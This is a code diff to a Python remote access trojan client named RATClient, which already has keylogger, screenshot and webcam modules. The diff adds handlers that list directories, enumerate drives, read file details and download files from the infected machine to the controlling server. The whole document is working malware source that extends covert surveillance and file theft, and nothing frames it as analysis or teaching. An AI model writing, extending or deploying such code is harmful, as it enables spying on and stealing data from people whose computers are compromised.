@@ -17,6 +17,7 @@ from modules.screenshot import take_screenshot
 from modules.popup import show_popup, show_info_popup, show_warning_popup, show_error_popup
 from modules.photo import take_photo
 from modules.keylogger import get_keylogger
+from modules.file_browser import get_file_browser
 
 # Import protocol from server directory
 sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'server'))
@@ -118,6 +119,18 @@ class RATClient:
                 
             elif cmd == Commands.KEYLOG_STOP:
                 self.handle_keylog_stop_command()
+                
+            elif cmd == Commands.FILE_LIST:
+                self.handle_file_list_command(parsed)
+                
+            elif cmd == Commands.FILE_DOWNLOAD:
+                self.handle_file_download_command(parsed)
+                
+            elif cmd == Commands.FILE_INFO:
+                self.handle_file_info_command(parsed)
+                
+            elif cmd == Commands.GET_DRIVES:
+                self.handle_get_drives_command()
                 
             elif cmd == Commands.QUIT:
                 self.running = False
@@ -242,6 +255,76 @@ class RATClient:
                 print(f"[+] Sent keylog data ({len(data)} chars)")
         except Exception as e:
             print(f"[-] Failed to send keylog data: {e}")
+    
+    def handle_file_list_command(self, parsed_cmd):
+        """Handle file list command"""
+        try:
+            path = parsed_cmd.get('path')
+            print(f"[*] Listing directory: {path or 'current directory'}")
+            
+            file_browser = get_file_browser()
+            result = file_browser.list_directory(path)
+            
+            self.send_response(ResponseTypes.FILE_LIST, result)
+            print(f"[+] Directory listing sent ({result.get('total_items', 0)} items)")
+            
+        except Exception as e:
+            self.send_error(f"File list error: {e}")
+    
+    def handle_file_download_command(self, parsed_cmd):
+        """Handle file download command"""
+        try:
+            file_path = parsed_cmd.get('file_path')
+            if not file_path:
+                self.send_error("Missing file_path parameter")
+                return
+                
+            print(f"[*] Downloading file: {file_path}")
+            
+            file_browser = get_file_browser()
+            result = file_browser.download_file(file_path)
+            
+            if result.get('success'):
+                self.send_response(ResponseTypes.FILE_DOWNLOAD, result)
+                print(f"[+] File download sent ({result.get('size_formatted', 'unknown size')})")
+            else:
+                self.send_error(f"File download failed: {result.get('error')}")
+                
+        except Exception as e:
+            self.send_error(f"File download error: {e}")
+    
+    def handle_file_info_command(self, parsed_cmd):
+        """Handle file info command"""
+        try:
+            file_path = parsed_cmd.get('file_path')
+            if not file_path:
+                self.send_error("Missing file_path parameter")
+                return
+                
+            print(f"[*] Getting file info: {file_path}")
+            
+            file_browser = get_file_browser()
+            result = file_browser.get_file_info(file_path)
+            
+            self.send_response(ResponseTypes.FILE_INFO, result)
+            print(f"[+] File info sent")
+            
+        except Exception as e:
+            self.send_error(f"File info error: {e}")
+    
+    def handle_get_drives_command(self):
+        """Handle get drives command"""
+        try:
+            print("[*] Getting available drives...")
+            
+            file_browser = get_file_browser()
+            result = file_browser.get_drives()
+            
+            self.send_response(ResponseTypes.DRIVES_LIST, result)
+            print(f"[+] Drives list sent ({len(result.get('drives', []))} drives)")
+            
+        except Exception as e:
+            self.send_error(f"Get drives error: {e}")
     
     def send_response(self, response_type: str, payload=None):
         """Send response to server"""
